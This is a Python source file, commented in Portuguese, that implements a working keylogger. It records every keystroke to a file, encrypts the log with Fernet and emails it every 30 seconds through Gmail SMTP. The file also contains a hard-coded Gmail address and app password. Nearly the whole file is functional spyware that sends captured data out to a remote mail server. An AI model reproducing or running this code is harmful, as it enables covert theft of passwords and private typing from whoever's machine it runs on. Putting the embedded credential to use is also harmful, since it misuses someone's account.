import keyboard              # Captura eventos de teclado em tempo real
import threading             # Permite executar funções em paralelo (multithreading)
import time                  # Usado para controlar intervalos de tempo
from queue import Queue      # Estrutura de dados para armazenar teclas antes de gravar
from cryptography.fernet import Fernet  # Criptografia simétrica segura
import smtplib               # Envio de e-mails via protocolo SMTP
import ssl                   # Criação de conexão segura (SSL/TLS)
from email.message import EmailMessage  # Composição de mensagens de e-mail
import os                    # Manipulação de arquivos e verificação de existência
import logging               # Para logging de erros

# Configuração do logger
logging.basicConfig(filename='keylogger.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Caminhos dos arquivos usados no projeto
CAMINHO_LOG = "log.txt"                  # Arquivo temporário onde as teclas são registradas
CAMINHO_LOG_CRIPTO = "log_encrypted.txt" # Arquivo criptografado
CAMINHO_CHAVE = "chave.key"              # Arquivo que armazena a chave de criptografia

INTERVALO_GRAVACAO = 5  # Intervalo (em segundos) entre gravações do buffer no arquivo
INTERVALO_EMAIL = 30    # Intervalo (em segundos) para envio de e-mails


fila = Queue()  # Cria uma fila para armazenar teclas pressionadas antes de gravar

# Função chamada a cada tecla pressionada
def capturar_tecla(evento):
    nome = evento.name  # Obtém o nome da tecla

    # Identifica e formata teclas especiais
    if nome == "space":
        fila.put(" ")
    elif nome == "enter":
        fila.put("\n")
    elif nome == "tab":
        fila.put("\t")
    elif nome == "backspace":
        fila.put(" [BACKSPACE] ")
    elif len(nome) == 1:
        fila.put(nome)  # Tecla comum (letra, número ou símbolo)
    else:
        fila.put(f"[{nome}] ")  # Tecla especial (ex: shift, ctrl, etc.)


# Função que grava o conteúdo da fila no arquivo de log
def gravar_buffer():
    while True:  # Loop contínuo em segundo plano
        if not fila.empty():  # Se houver teclas na fila
            with open(CAMINHO_LOG, "a", encoding="utf-8") as f:
                while not fila.empty():
                    tecla = fila.get()  # Remove a próxima tecla da fila
                    f.write(tecla)      # Escreve no arquivo
        time.sleep(INTERVALO_GRAVACAO)  # Aguarda antes de verificar novamente


# Gera uma nova chave de criptografia se não existir
def gerar_chave():
    if not os.path.exists(CAMINHO_CHAVE):
        chave = Fernet.generate_key()
        with open(CAMINHO_CHAVE, "wb") as f:
            f.write(chave)

# Carrega a chave de criptografia do arquivo
def carregar_chave():
    with open(CAMINHO_CHAVE, "rb") as f:
        return f.read()

# Criptografa o conteúdo do arquivo de log
def criptografar_log():
    chave = carregar_chave()
    fernet = Fernet(chave)

    with open(CAMINHO_LOG, "rb") as f:
        dados = f.read()

    dados_criptografados = fernet.encrypt(dados)

    with open(CAMINHO_LOG_CRIPTO, "wb") as f:
        f.write(dados_criptografados)

# Descriptografa o conteúdo do arquivo criptografado
def descriptografar_log():
    chave = carregar_chave()
    fernet = Fernet(chave)

    with open(CAMINHO_LOG_CRIPTO, "rb") as f:
        dados_criptografados = f.read()

    dados_descriptografados = fernet.decrypt(dados_criptografados)

    with open("log_decrypted.txt", "wb") as f:
        f.write(dados_descriptografados)


# Envia o arquivo criptografado por e-mail

EMAIL_REMETENTE = "kaykekoeller.ofconsultorios@gmail.com"
EMAIL_DESTINATARIO = "kaykekoeller.ofconsultorios@gmail.com"
SENHA_EMAIL = "ixyh uyug izre ivvn"

def enviar_email():
    try:
        msg = EmailMessage()
        msg["Subject"] = "Log criptografado"
        msg["From"] = EMAIL_REMETENTE
        msg["To"] = EMAIL_DESTINATARIO
        msg.set_content("Segue em anexo o log criptografado.")

        # Anexa o arquivo criptografado
        with open(CAMINHO_LOG_CRIPTO, "rb") as f:
            conteudo = f.read()
            msg.add_attachment(conteudo, maintype="application", subtype="octet-stream", filename="log_encrypted.txt")

        contexto = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=contexto) as servidor:
            servidor.login(EMAIL_REMETENTE, SENHA_EMAIL)
            servidor.send_message(msg)
        logging.info("E-mail enviado com sucesso.")
    except Exception as e:
        logging.error(f"Erro ao enviar e-mail: {str(e)}")

# Função para enviar e-mails periodicamente
def enviar_email_periodico():
    while True:
        time.sleep(INTERVALO_EMAIL)
        criptografar_log()
        enviar_email()



if __name__ == "__main__":
    gerar_chave()  # Garante que a chave de criptografia esteja disponível

    # Inicia uma thread em segundo plano para gravar o buffer periodicamente
    threading.Thread(target=gravar_buffer, daemon=True).start()

    # Inicia uma thread para envio periódico de e-mails
    threading.Thread(target=enviar_email_periodico, daemon=True).start()

    # Inicia a escuta de teclas pressionadas
    keyboard.on_press(capturar_tecla)

    try:
        keyboard.wait()  # Mantém o programa rodando até ser interrompido manualmente
    except KeyboardInterrupt:
        pass  # Permite encerrar com Ctrl+C sem erro

    # Após encerramento, criptografa o log e envia por e-mail
    criptografar_log()
    enviar_email()
